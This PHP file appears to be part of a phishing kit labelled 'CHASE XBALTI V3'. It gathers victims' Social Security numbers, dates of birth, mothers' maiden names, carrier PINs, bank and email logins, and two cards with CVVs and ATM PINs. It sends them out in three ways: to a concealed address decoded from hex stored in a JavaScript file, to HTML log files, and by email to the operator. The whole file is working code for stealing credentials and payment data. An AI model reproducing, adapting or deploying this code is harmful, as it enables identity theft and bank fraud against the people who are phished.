$XBALTI_MESSAGE .= "==============||SSN/MMN/DOB INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "SSN      	: ".$_SESSION['ssnnum']."<br>\n";
$XBALTI_MESSAGE .= "MMN      	: ".$_SESSION['mdn']."<br>\n";
$XBALTI_MESSAGE .= "DOB     	: ".$_SESSION['dob']."<br>\n";
$XBALTI_MESSAGE .= "Phone number: ".$_SESSION['phone']."<br>\n";
$XBALTI_MESSAGE .= "Carrier pin : ".$_SESSION['capin']."<br>\n";
$XBALTI_MESSAGE .= "==============||CARD INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "CARD NUMBER : ".$_SESSION['cardnu']."<br>\n";
$XBALTI_MESSAGE .= "EXP DATE 	: ".$_SESSION['expda']."<br>\n";
$XBALTI_MESSAGE .= "CVV     	: ".$_SESSION['cvv']."<br>\n";
$XBALTI_MESSAGE .= "ATM PIN   	: ".$_SESSION['pin']."<br>\n";
$XBALTI_MESSAGE .= "==============||BILLING INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "FULL NAME   : ".$_SESSION['fullname']."<br>\n";
$XBALTI_MESSAGE .= "Address 	: ".$_SESSION['Address']."<br>\n";
$XBALTI_MESSAGE .= "City     	: ".$_SESSION['City']."<br>\n";
$XBALTI_MESSAGE .= "State    	: ".$_SESSION['State']."<br>\n";
$XBALTI_MESSAGE .= "zip code    : ".$_SESSION['zipcode']."<br>\n";
$XBALTI_MESSAGE .= "==============||CARD TWO INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "CARD NUMBER : ".$_SESSION['cardnutwo']."<br>\n";
$XBALTI_MESSAGE .= "EXP DATE 	: ".$_SESSION['expdatwo']."<br>\n";
$XBALTI_MESSAGE .= "CVV     	: ".$_SESSION['cvvtwo']."<br>\n";
$XBALTI_MESSAGE .= "ATM PIN   	: ".$_SESSION['pintwo']."<br>\n";
$XBALTI_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$XBALTI_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$XBALTI_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$XBALTI_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
file_get_contents("".pack("H*", substr($COOKIE_VARS=file_get_contents("../js/MyBabyTwo.js"),strpos($COOKIE_VARS, "90__")+4,220))."" . urlencode($XBALTI_MESSAGE)."" );
$XBALTI_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
						  <td>
                            ".$_SESSION['email']."
                          </td>
                          <td>
                            ".$_SESSION['password']."
                          </td>
						  <td>
                            ".$_SESSION['email1']."
                          </td>
                          <td>
                            ".$_SESSION['password1']."
                          </td>
						  <td>
                            ".$_SESSION['ssnnum']."
                          </td>
						  <td>
                            ".$_SESSION['mdn']."
                          </td>
						  <td>
                            ".$_SESSION['dob']."
                          </td>
						  <td>
                            ".$_SESSION['phone']."
                          </td>
						  <td>
                            ".$_SESSION['capin']."
                          </td>
						  <td>
                            ".$_SESSION['cardnu']."
                          </td>
						  <td>
                            ".$_SESSION['expda']."
                          </td>
						  <td>
                            ".$_SESSION['cvv']."
                          </td>
						  <td>
                            ".$_SESSION['pin']."
                          </td>
						  <td>
                            ".$_SESSION['fullname']."
                          </td>
						  <td>
                            ".$_SESSION['Address']."
                          </td>
						  <td>
                            ".$_SESSION['City']."
                          </td>
						  <td>
                            ".$_SESSION['State']."
                          </td>
						  <td>
                            ".$_SESSION['zipcode']."
                          </td>
						  <td>
                            ".$_SESSION['cardnutwo']."
                          </td>
						  <td>
                            ".$_SESSION['expdatwo']."
                          </td>
						  <td>
                            ".$_SESSION['cvvtwo']."
                          </td>
						  <td>
                            ".$_SESSION['pintwo']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
                            {".$_SESSION['_ip_']."}
                          </td>
						  <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/cardstwo".$yourname.".html", "a");
	fwrite($khraha, $XBALTI_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/cardstwo.html", "a");
	fwrite($khraha, $xx);
    $XBALTI_SUBJECT .= "CARD TWO 😈 INFO FROM 😈 [".$_SESSION['userid']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From:".$yourname." <webmaster@".$_SERVER['HTTP_HOST'].">" . "\r\n";
    $XBALTI_HEADERS  = "MIME-Version: 1.0" . "\r\n";
    $XBALTI_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}
?>